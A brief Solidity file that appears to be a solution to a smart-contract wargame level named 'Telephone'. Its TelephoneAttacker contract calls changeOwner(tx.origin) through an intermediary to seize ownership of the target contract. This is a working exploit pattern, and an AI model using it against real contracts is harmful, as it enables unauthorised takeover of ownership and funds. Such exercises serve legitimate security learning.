// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone public instance;

    constructor(address _instance) public {
        instance = ITelephone(_instance);
    }

    function attack() public {
        instance.changeOwner(tx.origin);
    }
}
